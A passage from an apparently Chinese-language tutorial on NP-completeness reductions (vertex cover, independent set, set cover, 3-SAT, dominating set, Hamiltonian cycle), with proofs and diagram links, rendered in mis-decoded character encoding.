Xï¼Œé‚£ä¹ˆ X  â‰¡<sub>p</sub> Yï¼Œ å³ X å’Œ Y ç­‰ä»·ã€‚\n\nä¾‹é¢˜ï¼š\n\n| ![](https://img.jwt1399.top//img/image-20211029191456394.png) | ![](https://img.jwt1399.top//img/image-20211029191959453.png) |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| C                                                            | B                                                            |\n\n**æœ‰å¤šé¡¹å¼æ—¶é—´ç®—æ³•çš„é—®é¢˜å’Œå¯èƒ½æ²¡æœ‰å¤šé¡¹å¼æ—¶é—´ç®—æ³•çš„é—®é¢˜**\n\n| æœ‰å¤šé¡¹å¼æ—¶é—´ç®—æ³•   | å¯èƒ½æ²¡æœ‰å¤šé¡¹å¼æ—¶é—´ç®—æ³• |\n| ------------------ | ---------------------- |\n| æœ€çŸ­è·¯é—®é¢˜         | æœ€é•¿è·¯é—®é¢˜             |\n| æœ€å°å‰²é—®é¢˜         | æœ€å¤§å‰²é—®é¢˜             |\n| 2å…ƒå¯æ»¡è¶³æ€§é—®é¢˜    | 3å…ƒå¯æ»¡è¶³æ€§é—®é¢˜        |\n| å¹³é¢å›¾4ç€è‰²é—®é¢˜    | å¹³é¢å›¾3ç€è‰²é—®é¢˜        |\n| äºŒéƒ¨å›¾é¡¶ç‚¹è¦†ç›–é—®é¢˜ | ä¸€èˆ¬å›¾é¡¶ç‚¹è¦†ç›–é—®é¢˜     |\n| åŒ¹é…é—®é¢˜           | 3DåŒ¹é…é—®é¢˜             |\n| ç´ æ€§æµ‹è¯•é—®é¢˜       | è´¨å› å­åˆ†è§£é—®é¢˜         |\n| çº¿æ€§è§„åˆ’é—®é¢˜       | æ•´æ•°çº¿æ€§è§„åˆ’é—®é¢˜       |\n\nçœ‹åˆ°è¿™é‡Œï¼Œå°ç®€è§‰å¾—ä½ å·²ç»å¯¹å½’çº¦æœ‰äº†ä¸€ä¸ªåŸºæœ¬çš„è®¤çŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¦‚ä½•è¿›è¡Œè§„çº¦å‘¢ï¼Œè«æ…Œè«æ…Œï¼Œä¸‹é¢å°ç®€å°†å¯¹å…·ä½“é—®é¢˜å¦‚ä½•è§„çº¦è¿›è¡Œè¯¦ç»†å™è¿°ï¼Œå‹æƒ…æç¤ºä¸‹æ–¹å†…å®¹é«˜èƒ½ï¼Œè¯·è¯»è€…åšå¥½å¿ƒç†å‡†å¤‡ï¼Œè€å¿ƒé˜…è¯»ï¼Œåå¤ç ”è¯»ï¼ŒåŠ æ²¹ï¼\n\n### â¸ä¸€èˆ¬å½’çº¦æ–¹æ³•\n\nå½’çº¦æ˜¯æŒ‡é—®é¢˜ A çš„ä»»ä½•å®ä¾‹èƒ½ç”¨é—®é¢˜ B çš„æ–¹æ³•æ¥è§£å†³ï¼ˆåˆ¤æ–­ï¼‰ï¼Œå¹¶ä¸” A çš„è§£ä¸ºâ€œæ˜¯â€ï¼Œå½“ä¸”ä»…å½“ B çš„è§£ä¹Ÿæ˜¯â€œæ˜¯â€ã€‚å› æ­¤ï¼Œè¯æ˜å½’çº¦æ˜¯**åŒå‘çš„**ï¼Œç›®å‰é‡åˆ°çš„å¤§å¤šå½’çº¦é—®é¢˜ï¼ˆA â‰¤<sub>p</sub> Bï¼‰éƒ½å¯ä»¥æŒ‰ä»¥ä¸‹æ­¥éª¤è¿›è¡Œï¼š\n\n1. æ„é€ å›¾ G ï¼Œå­˜åœ¨é—®é¢˜ A çš„è§£é›†ï¼›\n2. åœ¨å›¾ G åŸºç¡€ä¸Šï¼Œæ„é€ å›¾ G'ï¼ˆå¸¸æ·»åŠ è¾¹æˆ–ç‚¹ï¼‰ï¼Œä½¿å¾—é—®é¢˜ A çš„è§£é›†èƒ½ååº”åœ¨ G' ä¸­é—®é¢˜ B çš„è§£é›†ï¼ˆæ³¨æ„ä¸¤ä¸ªé—®é¢˜è§£é›†çš„è§„æ¨¡ k ä¸€å®šè¦æœ‰ç¡®å®šçš„è”ç³»ï¼‰ï¼›\n3. å›¾ G ä¸­å­˜åœ¨é—®é¢˜ A çš„è§£é›† Sï¼Œå½“ä¸”ä»…å½“å›¾ G' ä¸­å­˜åœ¨é—®é¢˜ B çš„è§£é›† S' ï¼›\n4. è§„çº¦çš„æ­£ç¡®æ€§ï¼Œéœ€åŒå‘è¯æ˜ã€‚\n\nä¹Ÿæœ‰ä¸ç”¨æ„é€ æ–°å›¾çš„ï¼Œæ¯”å¦‚ç‚¹è¦†ç›–åˆ°ç‹¬ç«‹é›†çš„è§„çº¦ï¼Œè¿™ç§æ–¹æ³•å«ç›´æ¥è§„çº¦ã€‚ä½†å¤§å¤šæœ‰äº›éš¾åº¦çš„å½’çº¦ä¸€èˆ¬éƒ½éœ€è¦æ„é€ ã€‚\n\n### â¹é‡ç‚¹æŒæ¡çš„å½’çº¦\n\n#### â‘ é¡¶ç‚¹è¦†ç›–â‰¡<sub>p</sub>ç‹¬ç«‹é›†\n\n> **Vertex-Cover â‰¡<sub>pÂ </sub>Independent Setï¼ˆé¡¶ç‚¹è¦†ç›– â‰¡<sub>p </sub>ç‹¬ç«‹é›†ï¼‰**\n\n`é¡¶ç‚¹è¦†ç›–é—®é¢˜ï¼š`ç»™å®šä¸€ä¸ªå›¾ G = ( V , E )å’Œä¸€ä¸ªæ•´æ•° k ï¼Œæ˜¯å¦å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º k çš„é¡¶ç‚¹å­é›†ï¼Œä½¿å›¾ä¸­æ¯ä¸€æ¡è¾¹è‡³å°‘æœ‰ä¸€ä¸ªé¡¶ç‚¹åœ¨ä¸Šè¿°é¡¶ç‚¹å­é›†ä¸­ã€‚\n\nå¦‚å›¾ï¼Œé»‘è‰²çš„ç‚¹é›†åˆéƒ½æ˜¯é¡¶ç‚¹è¦†ç›–é›†åˆï¼Œå›¾çš„æ¯ä¸€æ¡è¾¹éƒ½è‡³å°‘æœ‰ä¸€ä¸ªé¡¶ç‚¹åœ¨ç‚¹é›†åˆä¸­ã€‚\n\n![é¡¶ç‚¹è¦†ç›–é›†(é»‘è‰²)](https://img.jwt1399.top/img/202111111714918.webp)\n\n`ç‹¬ç«‹é›†é—®é¢˜ï¼š`ç»™å®šä¸€ä¸ªå›¾ G = ( Vï¼ŒE )å’Œä¸€ä¸ªæ•´æ•° k ï¼Œæ˜¯å¦å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º k çš„é¡¶ç‚¹å­é›†ï¼Œä½¿å­é›†ä¸­ä»»æ„ä¸¤ä¸ªé¡¶ç‚¹ä¸é‚»æ¥ã€‚å³é¡¶ç‚¹é›†åˆä¸­çš„ä»»æ„ä¸¤ä¸ªç‚¹ä¹‹é—´æ²¡æœ‰è¾¹ã€‚\n\nå¦‚å›¾ï¼Œçº¢è‰²sçš„ç‚¹é›†åˆéƒ½æ˜¯ç‹¬ç«‹é›†ï¼Œä»»æ„ä¸¤ä¸ªçº¢è‰²çš„é¡¶ç‚¹æ²¡æœ‰è¾¹ã€‚\n\n![ç‹¬ç«‹é›†(çº¢è‰²)](https://img.jwt1399.top/img/202111111714615.webp)\n\nä¾‹é¢˜ï¼š\n\n<img src=\"https://img.jwt1399.top//img/image-20211029192154553.png\" alt=\"é€‰C\" style=\"zoom:80%;\" />\n\n**ä¸¤ä¸ªé—®é¢˜å¯ä»¥å½’çº³ä¸ºï¼š**\n\nç‹¬ç«‹é›†é—®é¢˜ï¼š    ç»™å®šå›¾ G å’Œæ•° k ï¼Œé—® G æ˜¯å¦åŒ…å«å¤§å°ä¸º k çš„ç‹¬ç«‹é›†ï¼Ÿ\né¡¶ç‚¹è¦†ç›–é—®é¢˜ï¼šç»™å®šå›¾ G å’Œæ•° k ï¼Œé—® G æ˜¯å¦åŒ…å«å¤§å°ä¸º k çš„é¡¶ç‚¹è¦†ç›–ï¼Ÿ\n\n> **ï¼ˆé¡¶ç‚¹è¦†ç›– â‰¡<sub>p </sub>ç‹¬ç«‹é›†ï¼‰é—®é¢˜æè¿°**ï¼šè®¾å›¾ G = ( V , E ) ï¼ŒS âŠ† Vï¼Œè‹¥ S æ˜¯ä¸€ä¸ªå¤§å°ä¸º k çš„`ç‹¬ç«‹é›†`å½“ä¸”ä»…å½“ V âˆ’ S æ˜¯ä¸€ä¸ªå¤§å°ä¸º n âˆ’ k çš„`é¡¶ç‚¹è¦†ç›–`\n\n`è¯æ˜:`\n**â‡’** \n\nâ€‹\tS æ˜¯å›¾ G çš„ä»»ä¸€ç‹¬ç«‹é›†\nâ€‹\tåˆ™ä»»æ„è¾¹ (u,v) âˆˆ Eï¼Œæœ‰u âˆ‰ S æˆ– v âˆ‰ S æˆ– u,v éƒ½ âˆ‰ Sï¼›é‚£ä¹ˆ uâˆˆV-S æˆ– vâˆˆV-S æˆ– u,v éƒ½ âˆˆ S\nâ€‹\tæ‰€ä»¥å›¾çš„ä»»æ„è¾¹ (u,v) è‡³å°‘æœ‰ä¸€ä¸ªé¡¶ç‚¹åœ¨é›†åˆ V-S ä¸­ï¼Œå³é›†åˆ V-S æ˜¯ä¸€ä¸ªé¡¶ç‚¹è¦†ç›–\n\n**â‡** \n\nâ€‹\tV-S æ˜¯å›¾ G çš„ä»»ä¸€é¡¶ç‚¹è¦†ç›–\nâ€‹\tåˆ™ä»»æ„è¾¹ (u,v) âˆˆ Eï¼Œæœ‰ u âˆˆ V-S æˆ– v âˆˆ V-S æˆ– u,v éƒ½ âˆˆ V-S ï¼›é‚£ä¹ˆ u âˆ‰ S æˆ– v âˆ‰ S æˆ– u,v éƒ½ âˆ‰ V-S\nâ€‹\tæ‰€ä»¥å›¾çš„ä»»æ„è¾¹è‡³å°‘æœ‰ä¸€ä¸ªç«¯ç‚¹ä¸åœ¨é›†åˆ S ä¸­ï¼Œé›†åˆ S æ˜¯ä¸€ä¸ªç‹¬ç«‹é›†\n\nâˆ´  Vertex-Cover â‰¡<sub>p</sub> Independent Set\n\n#### â‘¡é¡¶ç‚¹è¦†ç›–â‰¤<sub>p</sub>é›†åˆè¦†ç›–\n\n> **Vertex-Cover â‰¤<sub>p</sub> Set-Coverï¼ˆé¡¶ç‚¹è¦†ç›– â‰¤<sub>p </sub>é›†åˆè¦†ç›–ï¼‰**\n\n`é›†åˆè¦†ç›–é—®é¢˜ï¼š`ç»™å®š n ä¸ªå…ƒç´ çš„é›†åˆ U , S<sub>1</sub>ï¼ŒS<sub>2</sub>ï¼Œ... ï¼ŒS<sub>m</sub> æ˜¯ U çš„å­é›†ï¼Œç»™å®šæ•° k ï¼Œ é—®åœ¨è¿™äº›å­é›†ä¸­æ˜¯å¦æœ‰å‡ ç»„å­é›†ï¼Œå®ƒä»¬çš„å¹¶é›†ç­‰äºæ•´ä¸ª U ä¸”è‡³å¤šå«æœ‰ k ç»„å­é›†ï¼Ÿ\n\nå¦‚å›¾ï¼Œé›†åˆè¦†ç›–å¤§å°ä¸º k = 2 \n\n![](https://img.jwt1399.top//img/image-20211029184922160.png)\n\nä¾‹é¢˜ï¼š\n\n![é€‰C](https://img.jwt1399.top//img/image-20211029192302351.png)\n\n> **ï¼ˆé¡¶ç‚¹è¦†ç›– â‰¤<sub>p </sub>é›†åˆè¦†ç›–ï¼‰é—®é¢˜æè¿°ï¼š**ç»™ä»»æ„ä¸€ä¸ªé¡¶ç‚¹è¦†ç›–é—®é¢˜çš„å®ä¾‹ G=ï¼ˆVï¼ŒEï¼‰å’Œ kï¼Œéƒ½èƒ½æ„é€ å‡ºå¯¹åº”çš„é›†åˆè¦†ç›–å®ä¾‹ï¼ˆUï¼ŒSï¼Œkï¼‰ã€‚é›†åˆè¦†ç›–å¤§å°ä¸º k å½“ä¸”ä»…å½“é¡¶ç‚¹è¦†ç›–å¤§å°ä¸º k ã€‚\n\n`è¯æ˜ï¼š`\n\næ„é€ æ€è·¯ï¼šåŸé¡¶ç‚¹è¦†ç›–çš„é¡¶ç‚¹ç›¸å½“äºé›†åˆè¦†ç›–ä¸­çš„å­é›†åˆï¼ŒåŸé¡¶ç‚¹è¦†ç›–çš„è¾¹ç›¸å½“äºé›†åˆè¦†ç›–çš„å­é›†åˆä¸­å…ƒç´ ã€‚\n\n![](https://img.jwt1399.top//img/image-20211029193948736.png)\n\n**â‡’**\n\nâ€‹\tä»¤ X âŠ† V ä¸º G ä¸­å¤§å°ä¸º k çš„é¡¶ç‚¹è¦†ç›–ï¼Œåˆ™ Y = {S <sub>v</sub> | v âˆˆ X } ä¸ºå¤§å°ä¸º k çš„é›†åˆè¦†ç›–ã€‚\n**â‡** \n\nâ€‹\tä»¤ Y âŠ† S ä¸º (Uï¼ŒSï¼Œk) ä¸­å¤§å°ä¸º k çš„é›†åˆè¦†ç›–ï¼Œåˆ™ X = { v | S<sub>v</sub> âˆˆ Y } ä¸º G ä¸­å¤§å°ä¸º k çš„é¡¶ç‚¹è¦†ç›–ã€‚\nâˆ´  Vertex-Cover â‰¤<sub>p</sub> Set-Cover\n\n#### â‘¢3-SATâ‰¤<sub>p</sub>ç‹¬ç«‹é›†\n\n> **3-SAT â‰¤<sub>p</sub> Independent Setï¼ˆ3-SAT â‰¤<sub>p </sub> ç‹¬ç«‹é›†ï¼‰**\n\n`SATé—®é¢˜ï¼š`SAT é—®é¢˜å«ä½œå¸ƒå°”å¯æ»¡è¶³æ€§é—®é¢˜ï¼ˆBoolean satisfiability problemï¼‰\n\nç»™å®šå˜é‡é›† X = {x<sub>1</sub>ï¼Œx<sub>2</sub>ï¼Œ... ï¼Œx<sub>n</sub>} ä¸Šçš„ä¸€ç»„å­å¥ C<sub>1</sub>ï¼ŒC<sub>2</sub>ï¼Œ... ï¼ŒC<sub>n</sub> ï¼Œå­å¥ä¸º X ä¸­ä¸€äº›å…ƒç´ çš„å¹¶é›†ï¼Œå¤šä¸ªå­å¥çš„äº¤é›†æ„æˆä¸€ä¸ªåˆå–èŒƒå¼ï¼Œé—®æ˜¯å¦å­˜åœ¨ä½¿åˆå–èŒƒå¼ä¸ºçœŸçš„åˆ†é…æ–¹æ¡ˆï¼Ÿ\n\n`3-SATé—®é¢˜ï¼š`3-SAT é—®é¢˜å«ä½œä¸‰å…ƒå¯æ»¡è¶³æ€§é—®é¢˜ã€‚\n\nè‹¥é™å®š SATé—®é¢˜åˆå–èŒƒå¼ä¸­çš„æ¯ä¸ªå­å¥ä¸­å…ƒç´ çš„æ•°é‡ä¸º 3 ä¸ªï¼Œåˆ™ä¸º 3-SAT é—®é¢˜ã€‚\n\n> **ï¼ˆ3-SAT â‰¤<sub>p </sub> ç‹¬ç«‹é›†ï¼‰é—®é¢˜æè¿°ï¼š**ç»™å®šä¸€ä¸ª 3-SAT é—®é¢˜çš„å®ä¾‹ Ğ¤ ï¼Œæˆ‘ä»¬éƒ½èƒ½æ„é€ å‡ºä¸€ä¸ªå›¾ G = ( V , E ) ç‹¬ç«‹é›†é—®é¢˜çš„å®ä¾‹ã€‚3-SATé—®é¢˜æœ‰è§£ï¼Œå½“ä¸”ä»…å½“ G ä¸­ k = âˆ£ Ğ¤ âˆ£ï¼Œâˆ£ Ğ¤ âˆ£ å¤§å°ä¸ºåˆå–èŒƒå¼ä¸­å­å¥çš„ä¸ªæ•°ã€‚\n\n`è¯æ˜ï¼š`\n\næ„å›¾æ€è·¯ï¼š\n\n- *G*ä¸­ä¸‰ä¸ªé¡¶ç‚¹æ„æˆä¸€ä¸ªä¸‰è§’å½¢è¡¨ç¤ºä¸€ä¸ªå­å¥ï¼Œæ¯ä¸ªèŠ‚ç‚¹è¡¨ç¤ºä¸€ä¸ªå…ƒç´ \n- æ¯ä¸ªé¡¶ç‚¹ä¸å…¶å¯¹ç«‹èŠ‚ç‚¹è¿çº¿\n\n![](https://img.jwt1399.top/img/202111111714726.png)\n\nè§„çº¦çš„æ­£ç¡®æ€§ï¼Œéœ€åŒå‘è¯æ˜ï¼Œå³ç‹¬ç«‹é›†å­˜åœ¨ï¼Œåˆ™ Ğ¤ è¢«æ»¡è¶³ï¼›Ğ¤ è¢«æ»¡è¶³ï¼Œåˆ™ç‹¬ç«‹é›†å­˜åœ¨ã€‚\n**â‡’**\n\nâ€‹\tå›¾ G å­˜åœ¨å¤§å°ä¸º k çš„ç‹¬ç«‹é›†ï¼Œé‚£ä¹ˆå„ä¸‰è§’å½¢ä¸­å¿…ç„¶æœ‰ä¸€ç‚¹åœ¨ç‹¬ç«‹é›†ä¸­ï¼ˆä¸‰è§’å½¢å†…çš„ç‚¹å‡ç›¸é‚»ï¼Œä¸ç‹¬ç«‹ï¼‰ï¼›\nâ€‹\tå°†è¿™ k ä¸ªç‚¹ï¼ˆå˜é‡ï¼‰çš„å€¼è®¾ä¸º trueï¼Œé‚£ä¹ˆå…¶ä½™æ‰€æœ‰ç‚¹çš„å–å€¼å‡å¯ç¡®å®šä¸‹æ¥ï¼›\nâ€‹\tå› ä¸ºè¿™ k ä¸ªç‚¹åœ¨ k ä¸ªä¸åŒçš„å¥å­ä¸­ï¼Œåˆ™ Ğ¤ èƒ½è¢«æ»¡è¶³ã€‚\n**â‡**\n\nĞ¤ è¢«æ»¡è¶³ï¼Œåœ¨ k ä¸ªå¥å­ä¸­é€‰å–ä¸‰ä¸ªå˜é‡è®¾ä¸º trueï¼Œå®ƒä»¬å¯¹åº”å›¾ G ä¸­ k ä¸ªä¸‰è§’å½¢ä¸­çš„ k ä¸ªç‚¹ï¼›\nè¿™ k ä¸ªç‚¹åˆšå¥½æ„æˆå›¾ G å¤§å°ä¸º k çš„ç‹¬ç«‹é›†ï¼ˆå› ä¸ºäº’åçš„å˜é‡ä¸ä¼šåŒæ—¶ä¸º trueï¼Œå³ä¸ä¼šåŒæ—¶åœ¨ k ä¸ªç‚¹ä¸­ï¼‰ã€‚\n\nâˆ´  3-SAT â‰¤<sub>p</sub> Independent Set\n\n`â‘ â‘¡â‘¢æ€»ç»“ï¼š`3-SAT â‰¤<sub>p</sub> ç‹¬ç«‹é›†é—®é¢˜ â‰¡<sub>p</sub>  é¡¶ç‚¹è¦†ç›– â‰¤<sub>p</sub> é›†åˆè¦†ç›–\n\n#### â‘£é¡¶ç‚¹è¦†ç›–â‰¤<sub>p</sub>æ”¯é…é›†\n\n> **Vertex-Cover â‰¤<sub>p</sub> Dominating-Setï¼ˆé¡¶ç‚¹è¦†ç›– â‰¤<sub>p </sub>æ”¯é…é›†é—®é¢˜ï¼‰**\n\n`æ”¯é…é›†é—®é¢˜ï¼š`ç»™å®šæ— å‘å›¾ G å’Œæ­£æ•´æ•° kï¼Œé—®å›¾ G ä¸­æ˜¯å¦å­˜åœ¨ k ä¸ªé¡¶ç‚¹çš„å­é›† s ï¼Œä½¿å¾—å¯¹äºå›¾ G ä¸­çš„ä»»æ„é¡¶ç‚¹ v ï¼Œè¦ä¹ˆ vâˆˆsï¼Œè¦ä¹ˆ v è‡³å°‘ä¸ S ä¸­çš„è‡³å°‘ä¸€ä¸ªé¡¶ç‚¹ç›¸é‚»ã€‚\n\n> **ï¼ˆé¡¶ç‚¹è¦†ç›– â‰¤<sub>p </sub>æ”¯é…é›†é—®é¢˜ï¼‰é—®é¢˜æè¿°ï¼š**ç»™ä»»æ„ä¸€ä¸ªé¡¶ç‚¹è¦†ç›–é—®é¢˜çš„å®ä¾‹ G=ï¼ˆVï¼ŒEï¼‰å’Œ kï¼Œéƒ½èƒ½æ„é€ å‡ºå¯¹åº”çš„æ”¯é…é›†å®ä¾‹ G'ã€‚æ”¯é…é›†å¤§å°ä¸º k å½“ä¸”ä»…å½“é¡¶ç‚¹è¦†ç›–å¤§å°ä¸º k ã€‚\n\n`è¯æ˜ï¼š`\n\næ„å›¾æ€è·¯ï¼šå¯¹ç»™å®šçš„å›¾Gï¼Œä½œå¦‚ä¸‹å¤„ç†ï¼šå¯¹äºå›¾Gçš„ä»»æ„ä¸€è¾¹uvï¼Œæ·»åŠ ä¸€ä¸ªç‚¹wï¼Œä½¿å¾—è¯¥è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹uã€våˆ†åˆ«ä¸wç›¸é‚»ï¼Œå¾—åˆ°æ–°çš„ä¸€ä¸ªæ— å‘å›¾Gâ€™ã€‚\n\n![](https://img.jwt1399.top/img/202111101836405.png)\n\n**â‡’**\n\nå‡è®¾ s æ˜¯ G çš„ä¸€ä¸ªé¡¶ç‚¹è¦†ç›–ï¼Œç”±äºæ‰€æœ‰è¾¹éƒ½è¢« s è¦†ç›–ï¼Œå› æ­¤å›¾ G' æ‰€æœ‰é¡¶ç‚¹ä¹Ÿéƒ½è¢« s æ‰€æ”¯é…ã€‚\n**â‡**\n\nå‡è®¾ s æ˜¯ G' çš„ä¸€ä¸ªæ”¯é…é›†ï¼Œå¦‚æœ s å«æœ‰æ–°é¡¶ç‚¹ wï¼Œå®ƒå¯ä»¥è¢« v æˆ–è€… u æ›¿æ¢å¹¶ä¸”ä»æ—§æ˜¯ä¸€ä¸ªæ”¯é…é›†ï¼ˆå› ä¸ºé¡¶ç‚¹ v å’Œ uéƒ½èƒ½è¦†ç›– w æ‰€è¦†ç›–çš„é¡¶ç‚¹ï¼‰ï¼Œå¯ä»¥å‡å®š s ä»…åŒ…å« G ä¸­çš„é¡¶ç‚¹ã€‚ç”±äº s æ”¯é…äº†æ‰€æœ‰æ–°é¡¶ç‚¹ï¼Œå®ƒä¸€å®šè‡³å°‘åŒ…å«åŸå›¾ä¸­æ¯æ¡è¾¹çš„ä¸¤ç«¯é¡¶ç‚¹ä¹‹ä¸€ï¼Œå› æ­¤å®ƒä¹Ÿæ˜¯ G çš„ä¸€ä¸ªé¡¶ç‚¹è¦†ç›–ã€‚\n\nâˆ´  Vertex-Cover â‰¤<sub>p</sub> Dominating-Set\n\n#### â‘¤æœ‰å‘å›¾Hamâ‰¤<sub>p</sub>æ— å‘å›¾Ham\n\n> **Directed Ham-cycle â‰¤<sub>p</sub>  Ham-cycleï¼ˆæœ‰å‘å›¾å“ˆå¯†å°”é¡¿åœˆ â‰¤<sub>p</sub> æ— å‘å›¾çš„å“ˆå¯†å°”é¡¿åœˆï¼‰**\n\n`å“ˆå¯†å°”é¡¿åœˆï¼š`è®¾æœ‰ä¸€ä¸ªå›¾ G=(V,E)ï¼Œè‹¥å…¶ä¸Šå­˜åœ¨ä¸€ä¸ªåœˆ Cï¼Œè¿™ä¸ªåœˆåŒ…å«è¯¥å›¾ä¸Šçš„æ¯ä¸€èŠ‚ç‚¹ï¼Œåˆ™ç§°è¯¥åœˆ C ä¸ºå“ˆå¯†é¡¿åœˆï¼Œå›¾ G ç§°ä¸ºå“ˆå¯†é¡¿å›¾ã€‚ä¸‹å›¾å°±æ˜¯ä¸€ä¸ªå«æœ‰å“ˆå¯†é¡¿åœˆçš„å“ˆå¯†é¡¿å›¾ã€‚\n\n![](https://img.jwt1399.top/img/image-20211108203843315.png)\n\n> **ï¼ˆæœ‰å‘å›¾å“ˆå¯†å°”é¡¿åœˆ â‰¤<sub>p</sub> æ— å‘å›¾çš„å“ˆå¯†å°”é¡¿åœˆï¼‰é—®é¢˜æè¿°ï¼š**ç»™å®šä¸€ä¸ª n ä¸ªèŠ‚ç‚¹çš„æœ‰å‘å›¾ G = ( V , E ) ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªå« 3n ä¸ªé¡¶ç‚¹çš„æ— å‘å›¾ G â€²ã€‚æœ‰å‘å›¾ G æ‹¥æœ‰å“ˆå¯†å°”é¡¿åœˆå½“ä¸”ä»…å½“æ— å‘å›¾ G â€² æ‹¥æœ‰å“ˆå¯†å°”é¡¿åœˆã€‚\n\n`è¯æ˜ï¼š`\n\næ„å›¾æ€è·¯ï¼šæŠŠæœ‰å‘å›¾ G ä¸­çš„ä¸€ä¸ªé¡¶ç‚¹ï¼Œæ‹†åˆ†æˆä¸‰ä¸ªé¡¶ç‚¹(è“ã€é»‘ã€ç™½)\n\n![](https://img.jwt1399.top/img/202111082108366.png)\n\nâ‡’\nå‡è®¾ G å­˜åœ¨ä¸€ä¸ªæœ‰å‘çš„å“ˆå¯†å°”é¡¿åœˆ Î“ ï¼Œé‚£ä¹ˆ Gâ€² ä¹Ÿæœ‰ä¸€ä¸ªè·Ÿä¸Šè¿°é¡ºåºä¸€è‡´çš„æ— å‘å“ˆå¯†å°”é¡¿åœˆ Î“â€²\nâ‡\nå‡è®¾ Gâ€² æœ‰ä¸€ä¸ªæ— å‘å“ˆå¯†å°”é¡¿åœˆ Î“â€² ï¼ŒÎ“â€² è®¿é—® Gâ€² ä¸­çš„é¡¶ç‚¹å¿…é¡»é€‰æ‹©ä»¥ä¸‹ä¸¤ç§é¡ºåºä¸­çš„ä¸€ä¸ªï¼š\n\n- é»‘ï¼Œç™½ï¼Œè“\n- é»‘ï¼Œè“ï¼Œç™½\n\nÎ“â€² ä¸­çš„é»‘è‰²èŠ‚ç‚¹å¯¹åº” Î“ ä¸­çš„å“ˆå¯†å°”é¡¿åœˆæˆ–è€…é€†åºä¸­çš„ä¸€ä¸ªã€‚\n\nâˆ´  Directed Ham-cycle  â‰¤<sub>p</sub> Ham-cycle\n\n#### â‘¥**3âˆ’SATâ‰¤<sub>p</sub>æœ‰å‘å›¾Ham**\n\n>  **(3âˆ’SAT â‰¤<sub>pÂ </sub>æœ‰å‘å›¾å“ˆå¯†å°”é¡¿åœˆ)é—®é¢˜æè¿°ï¼š**ç»™å®šä¸€ä¸ª 3âˆ’SAT çš„å®ä¾‹ï¼Œæˆ‘ä»¬éƒ½èƒ½æ„é€ å‡ºä¸€ä¸ªå›¾ Gï¼Œ3âˆ’SAT å®ä¾‹æœ‰è§£å½“ä¸”ä»…å½“å›¾ G å«æœ‰ä¸€ä¸ªå“ˆå¯†å°”é¡¿åœˆã€‚\n\n`è¯æ˜ï¼š`\n\næ„å›¾æ€è·¯ï¼š\n\n- å›¾ G ä¸­å“ˆå¯†å°”é¡¿åœˆçš„ä¸ªæ•°ä¸º 2<sup>n</sup> ä¸ªï¼Œæ¯ä¸ªå…ƒç´ æœ‰çœŸå‡ 2 ç§å¯èƒ½ï¼Œä¸€å…±æœ‰ n ä¸ªï¼Œä»å·¦åˆ°å³èµ‹å€¼ä¸ºçœŸï¼Œä»å³åˆ°å·¦èµ‹å€¼ä¸ºå‡\n- å¯¹äºæ¯ä¸ªå­å¥ï¼Œè‹¥å­˜åœ¨ x<sub>i</sub> ï¼Œåˆ™å¢åŠ ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä»å·¦åˆ°å³å¢åŠ è¾¹ï¼›è‹¥å­˜åœ¨ Â¬x<sub>i</sub>ï¼Œåˆ™å¢åŠ ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶ä»å³åˆ°å·¦å¢åŠ è¾¹\n\n![](https://img.jwt1399.top/img/image-20211205231006836.png)\n\n- å¯¹æ¯ä¸ªå˜é‡ xi(1â‰¤iâ‰¤n)ï¼Œåˆ›å»º 3m+3 ä¸ªé¡¶ç‚¹ï¼Œå‘½åä¸ºv<sub>i,1</sub>ï¼Œv<sub>i,2</sub>ï¼Œâ‹¯  v<sub>i,3m+3</sub> å¹¶ä¸”å¯¹ç›¸é‚»åºå·çš„ä¸¤ä¸ªé¡¶ç‚¹æ·»åŠ äº’ç›¸ä¹‹é—´çš„æœ‰å‘è¾¹ã€‚å¦‚æœ x<sub>i</sub> = 1ï¼Œåˆ™å½¢æˆä»å·¦å‘å³çš„ä¸€ä¸ªè·¯å¾„ï¼›å¦‚æœ Â¬x<sub>i</sub>=1ï¼Œåˆ™å½¢æˆä»å³å‘å·¦çš„ä¸€ä¸ªè·¯å¾„ã€‚\n- å¯¹æ¯ä¸ª 1â‰¤iâ‰¤nâˆ’1ï¼Œæ·»åŠ å››æ¡æœ‰å‘è¾¹(v<sub>i,1</sub>,v<sub>i+1,1</sub>),(v<sub>i,3m+3</sub>,v<sub>i+1,3m+3</sub>),(v<sub>i,1</sub>,v<sub>i+1,3m+3</sub>),(v<sub>i,3m+3</sub>,v<sub>i+1,1</sub>)\n- æ·»åŠ ä¸¤ä¸ªèŠ‚ç‚¹ s,tï¼Œæ·»åŠ æœ‰å‘è¾¹(s,v<sub>1,1</sub>),(s,v<sub>1,3m+3</sub>),(v<sub>n,1</sub>,t),(v<sub>n,3m+3</sub>,t)ã€‚ç„¶åå†æ·»åŠ æœ‰å‘è¾¹(t,s)ã€‚è¿™æ—¶å¾—åˆ°çš„å›¾ä¸­æœ‰ hamiltonian cycleã€‚\n- å¯¹äºæ¯ä¸€ä¸ª clause C<sub>jÂ </sub>= z<sub>1</sub>z<sub>2</sub>z<sub>3</sub>ï¼Œåˆ›å»ºå¯¹åº”çš„é¡¶ç‚¹ C<sub>j</sub>ã€‚\n  - å¦‚æœ z = x<sub>i</sub>ï¼Œåˆ™æ·»åŠ æœ‰å‘è¾¹ (v<sub>i,3j</sub>,C<sub>j</sub>) å’Œ (C<sub>j</sub>,v<sub>i,3j+1</sub>) ; \n  - å¦‚æœz = Â¬xiï¼Œåˆ™æ·»åŠ æœ‰å‘è¾¹ (C<sub>j</sub>,v<sub>i,3j</sub>) å’Œ (v<sub>i,3j+1</sub>,C<sub>j</sub>)ã€‚\n  - è¿™é‡Œ 1 â‰¤ j â‰¤ m,1 â‰¤ i â‰¤ nã€‚\n- å¦‚å¯¹å­å¥C<sub>1</sub> = x<sub>1</sub>âˆ¨Â¬x<sub>2</sub>âˆ¨x<sub>3</sub> ç”Ÿæˆå¦‚ä¸‹å›¾ä¸­è“è‰²æ‰€ç¤ºã€‚\n  - å¦‚æœé€‰æ‹©å­å¥ä¸­ x1 = 1ï¼Œåˆ™ x<sub>1</sub> å¯¹åº”çš„è·¯å¾„ä¸ºä»å·¦å‘å³ï¼›\n  - 